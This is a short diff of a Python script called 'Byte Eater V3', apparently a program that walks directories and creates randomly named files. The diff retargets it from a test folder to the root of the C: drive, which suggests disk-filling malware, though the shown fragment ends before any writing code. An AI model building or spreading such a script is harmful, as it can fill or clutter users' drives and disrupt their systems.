@@ -1,17 +1,10 @@
-
-
-
 # BYTE EATER V3
 # A SAMWRIGH-T PROGRAM
 # USE AT YOUR OWN RISK
 
-
 import os
 import random
 dictionary = "abcdefghijklmnopqrstuvwxyz123456789"
-
-
-
 
 def GetSubDirectories(parentDir):
     subDirectories = []
@@ -30,9 +23,7 @@ def GetSubDirectories(parentDir):
                     continue
     return subDirectories
 
-baseDir = str("C:/Users/Sam/Desktop/Testy/")
-#print(baseDir + GetSubDirectories(baseDir)[0] + "/hi.txt")
-
+baseDir = str("C:/")
 
 def RandomFileName():
     name = "/"
